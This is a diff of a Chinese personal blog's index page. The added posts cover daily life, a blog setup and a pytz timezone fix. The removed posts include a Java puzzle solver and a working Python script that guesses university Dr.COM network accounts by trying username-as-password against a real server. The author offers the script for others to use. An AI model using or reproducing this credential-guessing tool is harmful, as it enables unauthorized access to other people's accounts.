+<p>再看我这里的情况，就比较可怜了，只有刚刚收到的一小箱零食，而且全是干果，就从种类上也没法和taowen比。明天带去几包丰富一下我们的零食角。今天终于给metromall打通电话了，质问一下为何已经4天了还没有发货，对方客服MM也很无奈，为何我前几天没打通，仔细看过电话后发现我少播一个0！！！趁着没发货，我要求换成了完全脱脂的牛奶，0.3%脂肪，这下真能当水喝了，不知道味道会不会也和水一样。</p>
+
+<p>最近花钱有些快，前几天刚败了一个顶级墨水，是的，钢笔用的那种墨水，之所以叫顶级那当然价格是符合顶级的价格了，还有一些别的特性，等到货了再发图详述吧，而且现在比较可怜的是，墨水到了钢笔还没买，你说墨水都是这样顶级的了，难道我能买个六七块钱的英雄616配Ta么，要真是如此，墨水还不气死。必然是买只心仪已久的Lamy，但我是节约点买个safari呢还是多花点钱买个al-star，that&rsquo;s a good question！</p>
+
+<p>还有想败一笔的是买个咖啡机。。。嗯，受到taowen的影响（taowen在我人生中影响太大了！），越来越喜欢咖啡了，前几天喝了他一包日本挂耳咖啡，现在想自己磨一些喝，或者再有兴趣做个拉花，搞个卡布奇诺什么的往人人上、微博上发一发吸引一下小女生们（我也就这点虚荣了）。</p>
+
+<p>可这前提都是需要强大的money支持，马上到了要交房租的时候，稍感压力要来，还好学校的住宿费和部分学费及时退回我才敢这段时间大手大脚花个精光，还有就是申请到了最后这一年的国家励志奖学金，5K哦，加上一等奖学金1.2K，这么多应该够我再败一两件数码产品了。</p>
 
 		
 		
@@ -621,11 +484,11 @@ print len(link_list)</pre>
   
 
 
-<time datetime="2012-04-16T13:20:00+08:00" pubdate data-updated="true">Apr 16<span>th</span>, 2012</time></div>
+<time datetime="2012-10-22T22:59:00+08:00" pubdate data-updated="true">Oct 22<span>nd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/code-jam/'>Code jam</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/life/'>life</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -637,134 +500,16 @@ print len(link_list)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/08/9-numbers-calculate-110/">
+		<a href="/blog/2012/10/20/hello-world/">
 		
-			9个数运算结果为110</a>
+			Hello World</a>
 	</h2>
 	<div class="entry-content">
-		<p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
+		<p>这篇hello，world已经拖了好久了，想写的内容也换了很多，本想记一下怎么搭建出来的这个blog，原先感觉稍微有些难度，所以想记录一下，现在感觉也不是那么难，还是写点更值得记录的东西吧。</p>
 
-<p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
+<p>记录一下遇到的问题：</p>
 
-<pre class="prettyprint linenums bush:java" lang="java">import java.util.ArrayList;
-
-
-public class unittest
-{
-   public static void main(String[] argStrings)
-   {
-       long start = System.currentTimeMillis();
-       ArrayList&lt;String&gt; allopts = new ArrayList&lt;String&gt;();
-       int a,b,c,d,e,f,g,h;
-       for(a = 0;a &lt; 3;a++)
-           for(b = 0;b &lt; 3;b++)
-               for(c = 0;c &lt; 3;c++)
-                   for(d = 0;d &lt; 3;d++)
-                       for(e = 0;e &lt; 3;e++)
-                           for(f = 0;f &lt; 3;f++)
-                               for(g = 0;g &lt; 3;g++)
-                                   for(h = 0;h &lt; 3;h++) {
-                                       allopts.add(""+a+b+c+d+e+f+g+h);
-                                   }
-       
-       for (String string : allopts)
-       {
-           String base = "1x2x3x4x5x6x7x8x9";
-           for (int i = 0; i &lt; string.length(); i++)
-           {
-               String tmp = getOpt(Integer.parseInt(""+string.charAt(i)));
-               base = base.replaceFirst("x", tmp);
-           }
-           int x = getResult(base, string.replaceAll("2", "").replaceAll("0", "+").replaceAll("1", "-"));//2-&gt;null
-           if (x == 110)
-           {
-               System.out.println(base);
-           }
-       }
-       System.out.println("All Run Time: " + (System.currentTimeMillis() - start) + "ms");
-   }
-   
-   public static String getOpt(int opt) {
-       String retString = "";
-       switch (opt)
-       {
-           case 0:
-               retString = "+";
-               break;
-           case 1:
-               retString = "-";
-               break;
-           case 2:
-               retString = "";
-               break;
-           default:
-               break;
-       }
-       
-       return retString;
-   }
-   
-   public static int getResult(String calculatString, String optString)
-   {
-       ArrayList&lt;Integer&gt; allNum = new ArrayList&lt;Integer&gt;();
-       ArrayList&lt;String&gt; allOpt = new ArrayList&lt;String&gt;();
-       for (String string : calculatString.split("[+-]"))
-       {
-           allNum.add(Integer.parseInt(string));
-       }
-       for (int i = 0; i &lt; optString.length(); i++)
-       {
-           allOpt.add(optString.charAt(i) + "");
-       }
-       int result = allNum.get(0);
-       for (int i = 1; i &lt; allNum.size(); i++)
-       {
-           char x = (i - 1) == allOpt.size()?'+':allOpt.get(i - 1).charAt(0);
-           int nextNum = i == allNum.size()?0:allNum.get(i);
-           result = getValue(result, nextNum, x);
-       }
-       
-       return result;
-       
-   }
-   
-   public static int getValue(Integer num1, Integer num2, char opt)
-   {
-       int ret = 0;
-       switch (opt)
-       {
-           case '+':
-               ret = num1 + num2;
-               break;
-           case '-':
-               ret = num1 - num2;
-               break;
-           default:
-               break;
-       }
-       
-       return ret;
-   }
-}</pre>
-
-
-<p>结果是这样的：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">1+2+34+5+67-8+9
-1+234-56-78+9
-1-2+3+45-6+78-9
-12+3+45+67-8-9
-12+34+56+7-8+9
-12-3+4-5+6+7+89
-123+4+5+67-89
-123+4-5-6-7-8+9
-123-4+5-6-7+8-9
-123-4-5+6+7-8-9
-All Run Time: 496ms
-</pre>
-
-
-<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
+<blockquote><p>ruby的管理：我原先用homebrew，感觉能用了，可惜在运行rake generate的时候遇到问题，仍然使用了我的老版本ruby，最终我卸载了homebrew中的ruby，重新安装了rvm，通过rvm安装ruby，相关操作请到ruby-china的wiki中寻找，另外需要注意的是，通过rvm安装readline的时候竟然不是安装的最新版，可能这里也有问题，我使用了homebrew安装的readline，只需要在rvm安装ruby的时候传入&mdash;with-readline-dir=xxx即可，指向到readline的include目录。</p></blockquote>
 
 		
 		
@@ -784,11 +529,11 @@ All Run Time: 496ms
   
 
 
-<time datetime="2012-04-08T14:20:00+08:00" pubdate data-updated="true">Apr 8<span>th</span>, 2012</time></div>
+<time datetime="2012-10-20T20:25:00+08:00" pubdate data-updated="true">Oct 20<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/acm/'>acm</a>, <a class='category' href='/blog/categories/java/'>java</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/github/'>github</a>, <a class='category' href='/blog/categories/work-at-honovation/'>work@honovation</a>
 
 
 </div>
@@ -800,110 +545,14 @@ All Run Time: 496ms
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/04/crack-drcom-account-in-python/">
+		<a href="/blog/2012/10/20/6-minutes-offset-in-pytz/">
 		
-			Python猜研究生账号</a>
+			Pytz的6分钟时差</a>
 	</h2>
 	<div class="entry-content">
-		<p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
+		<p>项目中有使用pytz这个第三方库来处理datetiem相关的东西。不过最近测试的时候发现，创建了一个时间点后，最终得到的时间点和预想的时间点有6分钟的误差，从网上搜到的资料是这样解决的：详情看<a href="http://hi.baidu.com/limodou/item/72da32384b25c7ff97f88df1">http://hi.baidu.com/limodou/item/72da32384b25c7ff97f88df1</a></p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
-# encoding: utf-8
-
-import urllib2
-import urllib
-import sys
-import types
-
-guess_list = []
-server_url = "http://222.174.155.19/"
-headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
-'X-Forwarded-For':'1.1.1.1'}
-
-def usage():
-print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
-print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
-
-def Login(username, password):
-params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
-request = urllib2.Request(url = server_url, data = params, headers = headers)
-try:
-output = urllib2.urlopen(request, timeout = 3).readlines()
-Log(output[5], username, password)
-except:
-print "timeout!"
-global guess_list
-guess_list = guess_list[1:]
-guess_list.append(username)
-
-def Logout():
-output = urllib2.urlopen(server_url + "F.htm")
-
-def Log(output,username, password):
-# "msga='error1'" =&gt; can not login in web
-result = output.find("msga='error1'")
-if result != -1:
-print "find one!!!"
-f = open("./content.dat", 'a')
-f.write(str(username) + '\n')
-f.close()
-else:
-print "pass!"
-f = open("./bad.dat",'a')
-f.write(str(username) + '\n')
-f.close()
-#drop first element
-global guess_list
-guess_list = guess_list[1:]
-
-def show_result():
-print "Result:##########################################"
-print "Have Guessed:"
-for i in open("./content.dat").readlines():
-print i,
-print "some accounts can not guessed are in bad.dat"
-print "Result:##########################################"
-
-def get_timeout_list(timeout_file_path):
-f = open(timeout_file_path)
-global guess_list 
-guess_list = f.readlines()
-f.close()
-
-if len(sys.argv) == 2:
-# itself and only one argv,the path of account list file...
-get_timeout_list(sys.argv[1])
-elif(len(sys.argv) &lt; 2):
-usage()
-else:
-#start and end account,argv[1] and argv[2]
-start = int(sys.argv[1])
-end = int(sys.argv[2])
-if start &gt; end:
-usage()
-exit(-1)
-else:
-guess_list = range(start, end + 1)
-
-if __name__ == "__main__":
-
-while True:
-for i in guess_list:
-#drop last \n or \r
-if type(i) == types.StringType:
-i = i.rstrip('\n\r')
-Logout()
-print "Guess: " + str(i)
-Login(i, i)
-
-if len(guess_list) == 0:
-break
-show_result()</pre>
-
-
-<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
-
-<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
+<p>创建datetime的时候，特别是带timezone，需要localize一下，否则在使用pytz的时候就会出现这6分钟的差异。代码中首先创建了datetime，然后localize后再replace了timezone为pytz的，最终还astimezone为pytz.utc。我们是使用utc的，你的代码也许不需要：）</p>
 
 		
 		
@@ -923,11 +572,11 @@ show_result()</pre>
   
 
 
-<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true">Apr 4<span>th</span>, 2012</time></div>
+<time datetime="2012-10-20T16:13:00+08:00" pubdate data-updated="true">Oct 20<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/drcom/'>drcom</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/datetime/'>datetime</a>, <a class='category' href='/blog/categories/pytz/'>pytz</a>, <a class='category' href='/blog/categories/timezone/'>timezone</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
